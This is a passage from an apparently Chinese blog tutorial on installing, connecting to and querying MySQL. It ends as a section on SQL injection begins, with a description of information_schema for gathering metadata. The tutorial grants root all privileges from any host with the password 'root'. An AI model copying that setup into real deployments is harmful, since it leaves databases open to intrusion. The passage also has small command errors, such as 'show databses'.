+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/11.png" alt="11"></p>
+<p>登录成功后必须重设密码，否则会一直提示下面这行错误。</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">You</span> <span class="string">must</span> <span class="string">reset</span> <span class="string">your</span> <span class="string">password</span> <span class="string">using</span> <span class="string">ALTER</span> <span class="string">USER</span> <span class="string">statement</span> <span class="string">before</span> <span class="string">executing</span> <span class="string">this</span> <span class="string">statement.</span></span><br></pre></td></tr></table></figure>
+<p>重新设置密码后即可完成配置</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> &quot;root&quot;@&quot;localhost&quot; IDENTIFIED <span class="keyword">BY</span> &quot;新密码&quot;;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/12.png" alt="12"></p>
+<h4 id="Linux下安装"><a href="#Linux下安装" class="headerlink" title="Linux下安装"></a>Linux下安装</h4><p>在 Linux 安装 MySQL 相比 Windows 要简单方便许多，通常使用<code>apt</code>、<code>yum</code>等包管理软件就可以安装成功，下面以<code>yum</code>为例进行演示</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://repo.mysql.com/mysql-community-release-el7-5.noarch.rpm</span><br><span class="line">rpm mysql-community-release-el7-5.noarch.rpm</span><br><span class="line">yum update</span><br><span class="line">yum install mysql-server</span><br></pre></td></tr></table></figure>
+<p>有了 RPM 包后我们就可以下载获取对应的 MySQL 软件程序</p>
+<ul>
+<li>MySQL - MySQL服务器。你需要该选项，除非你只想连接运行在另一台机器上的MySQL服务器。</li>
+<li>MySQL-client - MySQL 客户端程序，用于连接并操作Mysql服务器。</li>
+<li>MySQL-devel - 库和包含文件，如果你想要编译其它MySQL客户端，例如Perl模块，则需要安装该RPM包。</li>
+<li>MySQL-shared - 该软件包包含某些语言和应用程序需要动态装载的共享库(libmysqlclient.so*)，使用MySQL。</li>
+<li>MySQL-bench - MySQL数据库服务器的基准和性能测试工具。 </li>
+</ul>
+<p>设置权限并启动 MySQL</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chown -R mysql:mysql /var/lib/mysql/</span><br><span class="line">mysqld --initialize</span><br><span class="line">systemctl start mysqld</span><br></pre></td></tr></table></figure>
+<p>有时候我们还会用到<code>MariaDB</code>，其实这时 MySQL 的一个分支，与 MySQL 完全兼容，安装命令如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install mariadb-server mariadb</span><br><span class="line">systemctl start mariadb</span><br></pre></td></tr></table></figure>
+
+<h3 id="MySQL连接"><a href="#MySQL连接" class="headerlink" title="MySQL连接"></a>MySQL连接</h3><h4 id="Windows下连接"><a href="#Windows下连接" class="headerlink" title="Windows下连接"></a>Windows下连接</h4><p>自动安装的话通过 phpstudy 直接安装开启服务即可，默认配置内容如下：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">username :</span> <span class="string">root（最高权限用户）</span></span><br><span class="line"><span class="attr">password :</span> <span class="string">root</span></span><br><span class="line"><span class="attr">port :</span> <span class="number">3306</span></span><br><span class="line"><span class="attr">host :</span> <span class="string">localhost</span></span><br></pre></td></tr></table></figure>
+
+<p>本地的话进入 MySQL 的 bin 目录通过<code>mysql.exe</code>就可以直接登录数据库</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql.exe -uroot -proot -hlocalhost -P3306</span><br></pre></td></tr></table></figure>
+
+<p>远程连接则需要在数据库中开启用户外联才能完成，比如设置root用户外联</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">on</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">to</span> root@<span class="string">&#x27;%&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;root&#x27;</span> <span class="keyword">with</span> <span class="keyword">grant</span> option;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2021-09-21%20%E4%B8%8B%E5%8D%885.31.21.png" alt="截屏2021-09-21 下午5.31.21"></p>
+<h4 id="Linux下连接"><a href="#Linux下连接" class="headerlink" title="Linux下连接"></a>Linux下连接</h4><p>在 Linux 中连接数据库也会方便不少，因为我们不需要进行环境变量的配置或进入 MySQL 的 bin 目录下操作</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -proot -hlocalhost -P3306</span><br></pre></td></tr></table></figure>
+
+<p>如果需要退出数据库的话，可使用如下命令完成退出</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">quit</span><br><span class="line">exit </span><br><span class="line">\q</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-MySQL基础用法"><a href="#0x03-MySQL基础用法" class="headerlink" title="0x03 MySQL基础用法"></a>0x03 MySQL基础用法</h2><h3 id="命令注释"><a href="#命令注释" class="headerlink" title="命令注释"></a>命令注释</h3><p>通过以下三类注释符可对执行命令进行注释</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#mac</span><br><span class="line"><span class="comment">--mac</span></span><br><span class="line"><span class="comment">/*mac*/</span></span><br></pre></td></tr></table></figure>
+<h3 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h3><p>查询当前数据库的基本信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> database(); ## 查看当前数据库</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>(); ##查看当前用户</span><br><span class="line"><span class="keyword">show</span> status; ##查看当前特定资源信息</span><br><span class="line"><span class="keyword">select</span> version(); ##查看当前数据库版本</span><br></pre></td></tr></table></figure>
+<p>对数据库进行增删改查</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> databses; ##查看所有数据库</span><br><span class="line"><span class="keyword">select</span> database(); ##查看当前数据库</span><br><span class="line">use mysql; ##使用mysql数据库</span><br><span class="line"><span class="keyword">create</span> database test1; ##添加test1数据库</span><br><span class="line"><span class="keyword">drop</span> database test1; ##删除数据库</span><br><span class="line"><span class="keyword">alter</span> database test1 charset utf8; ##修改数据库编码方式</span><br></pre></td></tr></table></figure>
+<p>对数据表进行增删改查</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> tables; ##查看当前数据库下所有表名</span><br><span class="line"><span class="keyword">desc</span> users; ##查看数据表内容，包含表结构、字段类型、主键、是否为空等属性</span><br><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> users; ##查看当前users表中账号密码</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> users(id <span class="type">int</span>(<span class="number">7</span>)); ##创建 users 表</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> users(id <span class="type">int</span>(<span class="number">7</span>) auto_increment,username <span class="type">varchar</span>(<span class="number">100</span>) <span class="keyword">not</span> <span class="keyword">null</span>,password <span class="type">char</span>(<span class="number">100</span>) <span class="keyword">not</span> <span class="keyword">null</span>,<span class="keyword">primary</span> key(id))engine<span class="operator">=</span>innodb <span class="keyword">default</span> charset<span class="operator">=</span>utf8; ##创建完整表</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> users; ##删除表</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> users rename users1; ##修改表</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> users modify username <span class="type">varchar</span>(<span class="number">155</span>); ##修改字段数据类型</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> users change username uname <span class="type">char</span>(<span class="number">111</span>); ##修改字段名</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> users <span class="keyword">add</span> <span class="keyword">desc</span> <span class="type">char</span>(<span class="number">111</span>) <span class="keyword">not</span> <span class="keyword">null</span>; ##增加字段名</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> users <span class="keyword">drop</span> <span class="keyword">desc</span>; ##删除字段名</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> users engine<span class="operator">=</span>myisam; ##修改存储表引擎</span><br></pre></td></tr></table></figure>
+
+<p><strong>数据类型介绍参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-xlp/p/8617760.html">https://www.cnblogs.com/-xlp/p/8617760.html</a></strong></p>
+<p>常见的约束条件</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">primary</span> <span class="string">key</span> <span class="comment">##标识该属性为该表的主键，可以唯一的标识对应的元组</span></span><br><span class="line"><span class="string">foreign</span> <span class="string">key</span> <span class="comment">##标识该属性为该表的外键，是与之联系某表的主键</span></span><br><span class="line"><span class="string">not</span> <span class="literal">null</span>    <span class="comment">##标识该属性不能为空</span></span><br><span class="line"><span class="string">unique</span>      <span class="comment">##标识该属性是唯一的</span></span><br><span class="line"><span class="string">auto_increment</span> <span class="comment">##标识该属性的值自动增加</span></span><br><span class="line"><span class="string">default</span>     <span class="comment">##标识该属性为默认值</span></span><br></pre></td></tr></table></figure>
+<p>对数据进行增删改查</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> users(id,username,password) <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;mac&#x27;</span>,<span class="string">&#x27;mac&#x27;</span>); ##为所有字段添加数据</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> users(username) <span class="keyword">values</span>(<span class="string">&#x27;mac1&#x27;</span>); ##为指定字段添加数据，id自动增加</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> users(id,username,password) <span class="keyword">values</span>(<span class="keyword">null</span>,<span class="string">&#x27;mac2&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>),(<span class="keyword">null</span>,<span class="string">&#x27;mac2&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>); ##指定字段增加多条数据</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> users <span class="keyword">values</span>(<span class="keyword">null</span>,<span class="string">&#x27;mac3&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>),(<span class="keyword">null</span>,<span class="string">&#x27;mac4&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>); ##增加多条数据</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>; ##删除数据，如果删除前id为<span class="number">7</span>，那么之后id增加为<span class="number">8</span>、<span class="number">9</span>、<span class="number">10.</span>..</span><br><span class="line"><span class="keyword">truncate</span> <span class="keyword">table</span> users; ##删除数据，会清除全部，如果删除前id为<span class="number">7</span>，那么之后id增加为<span class="number">1</span></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> users; ##全部删除表</span><br><span class="line">update users <span class="keyword">set</span> password<span class="operator">=</span>&quot;111111&quot; <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>; ##修改指定类型数据</span><br><span class="line">update users <span class="keyword">set</span> password<span class="operator">=</span>&quot;111111&quot;,username<span class="operator">=</span>&quot;mac2&quot; <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">2</span>; ##修改多种类型数据</span><br><span class="line">update users <span class="keyword">set</span> password<span class="operator">=</span>&quot;333333&quot;; ##修改所有类型数据</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users; ##查询users表中所有数据</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users; ##查询单个字段数据</span><br><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> users; ##查询多个字段数据</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>; ##按条件查询</span><br></pre></td></tr></table></figure>
+<p>常见关系运算符</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">=</span> <span class="string">等于</span></span><br><span class="line"><span class="type">!=</span> <span class="string">&lt;&gt;</span> <span class="string">不等于</span></span><br><span class="line"><span class="string">&lt;</span> <span class="string">小于</span> </span><br><span class="line"><span class="string">&gt;</span> <span class="string">大于</span> </span><br><span class="line"><span class="string">&lt;=</span> <span class="string">小于等于</span> </span><br><span class="line"><span class="string">&gt;=</span> <span class="string">大于等于</span> </span><br></pre></td></tr></table></figure>
+<h3 id="高级查询"><a href="#高级查询" class="headerlink" title="高级查询"></a>高级查询</h3><p>带in关键字查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">in</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">not</span> <span class="keyword">in</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br></pre></td></tr></table></figure>
+<p>空值查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">is</span> <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure>
+<p>去重复查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> username <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure>
+<p>like模糊查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">##<span class="operator">%</span>代表任意值</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> &quot;d%&quot;;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> &quot;%d%&quot;;</span><br><span class="line">##_代表单个任意值</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> &quot;d_&quot;;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> &quot;_d_&quot;;</span><br></pre></td></tr></table></figure>
+<p>and 和 or 多条件查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">&lt;</span> <span class="number">7</span> <span class="keyword">and</span> username <span class="operator">=</span> <span class="string">&#x27;mac3&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">5</span> <span class="keyword">or</span> username <span class="operator">=</span> <span class="string">&#x27;mac4&#x27;</span>;</span><br><span class="line">##<span class="keyword">and</span>和<span class="keyword">or</span>一起使用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">&gt;</span> <span class="number">2</span> <span class="keyword">and</span> password <span class="operator">=</span> <span class="string">&#x27;123456&#x27;</span> <span class="keyword">or</span> username <span class="operator">=</span> <span class="string">&#x27;mac1&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">&gt;</span> <span class="number">2</span> <span class="keyword">or</span> username <span class="operator">=</span> <span class="string">&#x27;mac2&#x27;</span> <span class="keyword">and</span> password <span class="operator">=</span> <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">当<span class="keyword">and</span>和<span class="keyword">or</span>一起使用时，<span class="keyword">and</span>的优先级高于<span class="keyword">or</span>，因此两者一起使用时会优先运算<span class="keyword">and</span>，再运算<span class="keyword">or</span></span><br></pre></td></tr></table></figure>
+<p>聚合查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(id) <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(id) <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">avg</span>(id) <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(id) <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">min</span>(id) <span class="keyword">from</span> users;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> users;</span><br><span class="line"></span><br><span class="line"><span class="built_in">count</span>() 返回某列的行数</span><br><span class="line"><span class="built_in">sum</span>()   返回某列值的和</span><br><span class="line"><span class="built_in">avg</span>()   返回某列的平均值</span><br><span class="line"><span class="built_in">max</span>()   返回某列的最大值</span><br><span class="line"><span class="built_in">min</span>()   返回某列的最小值</span><br></pre></td></tr></table></figure>
+
+<p>分组查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">##单独使用<span class="keyword">group</span> <span class="keyword">by</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> username;</span><br><span class="line"></span><br><span class="line">##<span class="keyword">group</span> <span class="keyword">by</span> 和 <span class="keyword">having</span>一起使用</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(id) <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> username;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(id) <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> username;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> username <span class="keyword">having</span> <span class="built_in">sum</span>(id)<span class="operator">&lt;</span><span class="number">6</span>;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>having关键字和where作用相同，区别在于having关键字可以跟聚合函数，而where关键字不能跟聚合函数。通常having关键字与group by一起使用，对分组结果进行过滤</p>
+</blockquote>
+<p>使用 limit 限制查询结果的数量</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit <span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit <span class="number">5</span>;</span><br><span class="line">#显示<span class="number">1</span><span class="number">-5</span>结果</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit <span class="number">1</span>,<span class="number">5</span>;</span><br></pre></td></tr></table></figure>
+<p>为表和字段取别名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">##为表取别名</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">as</span> u <span class="keyword">where</span> u.id <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">##为字段取别名</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">as</span> name <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure>
+<p>where子查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">in</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">&gt;</span> <span class="number">5</span>);</span><br><span class="line">## 把内层查询结果当作外层查询的比较条件</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">in</span> (<span class="keyword">select</span> id <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">&gt;</span> <span class="number">5</span>);</span><br></pre></td></tr></table></figure>
+
+<p>from子查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">&lt;</span> <span class="number">4</span>) <span class="keyword">as</span> re;</span><br><span class="line">## 将内层查询结果提供给外层再次查询</span><br></pre></td></tr></table></figure>
+
+<p>exists子查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">&gt;</span> <span class="number">2</span>);</span><br><span class="line">## 将外层查询结果拿到内层，看内层查询是否成立，加入括号内成立，则输出所有，返回不成立则无</span><br></pre></td></tr></table></figure>
+
+<p>联合查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span>,<span class="number">1</span> <span class="keyword">from</span> users1;</span><br></pre></td></tr></table></figure>
+
+<h3 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h3><p><strong>内连接关键词：inner join on</strong></p>
+<p>组合两个表中的记录，法牛话关联字段相符的记录，返回两个表的交集</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> a_new a <span class="keyword">inner</span> <span class="keyword">join</span> b_new b <span class="keyword">on</span> a.id <span class="operator">=</span> b.id;</span><br></pre></td></tr></table></figure>
+
+<p><strong>左连接操作关键词：left join on/ left outer join on</strong></p>
+<p>左连接就是左外连接，左表的记录将全部表示出来，右表只会显示符合搜索条件的记录，而右表记录不足的地方均为 null</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> a_new a <span class="keyword">left</span> <span class="keyword">join</span> b_new b <span class="keyword">on</span> a.id <span class="operator">=</span> b.id;</span><br></pre></td></tr></table></figure>
+
+<p><strong>右连接操作关键词：right join on/ right outer join on</strong></p>
+<p>右连接就是右外连接，左表只会显示符合搜索条件的记录，右表的记录将会全部表示出来，而左表记录不足的地方均为 null</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> a_new <span class="keyword">right</span> <span class="keyword">join</span> b_new b <span class="keyword">on</span> a.id <span class="operator">=</span> b.id;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-MySQL渗透"><a href="#0x04-MySQL渗透" class="headerlink" title="0x04 MySQL渗透"></a>0x04 MySQL渗透</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="数据库信息获取"><a href="#数据库信息获取" class="headerlink" title="数据库信息获取"></a>数据库信息获取</h4><p>information_schema 数据库是 MySQL 自带的，它提供了访问数据库元数据的方式，什么是元数据呢？元数据就是关于数据的数据，如数据库名、表名、列的数据类型、访问权限等。有时候用于表述该信息的其他术语包括“数据词典”和“系统目录”</p>
+<p>在 MySQL 中 information_schema 看作是一个数据库，确切的说是信息数据库。其中保存着关于mysql服务器维护的所有其他数据库的信息。如数据库名、数据库表、表栏的数据类型和访问权限等。而在 information_schema 中有数个只读表，实际上就是视图，而不是基本表，因此无法看到与之相关的任何文件</p>
+<blockquote>
+<ul>
+<li>schemata表：提供了当前数据库实例中所有数据库的信息。show database()的结果就是取自该表</li>
+<li>tables表：提供了关于数据库表的信息，描述了哪个表属于哪个库、表类型、表引擎、创建时间等信息，show tables from schemaname的结果就是取自该表</li>
+<li>columns表：提供了关于表中列的信息，描述了某张表上所有列信息，show columns from schemaname.tablename的结果就是取自该表</li>
+<li>statistics表：提供了关于表索引的信息，show index from schemaname.tablename的结果就是取自该表</li>
+<li>users_privileges表：提供了关于全程权限的信息，该信息取自mysql.user授权表，是非标准表</li>
+<li>schema_privileges表：提供了关于数据库权限的信息，该信息取自mysql.user授权表，是非标准表</li>
